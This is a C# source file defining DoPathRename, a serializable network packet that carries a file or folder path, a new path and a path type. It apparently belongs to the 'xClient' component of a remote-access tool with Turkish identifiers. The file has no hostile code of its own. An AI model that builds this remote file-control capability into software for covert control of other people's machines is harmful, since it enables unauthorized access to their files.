using System;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.Enumlar;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoPathRename : IPacket
    {
        public string Path { get; set; }

        public string NewPath { get; set; }

        public DizinTürleri PathType { get; set; }

        public DoPathRename()
        {
        }

        public DoPathRename(string path, string newpath, DizinTürleri pathtype)
        {
            this.Path = path;
            this.NewPath = newpath;
            this.PathType = pathtype;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}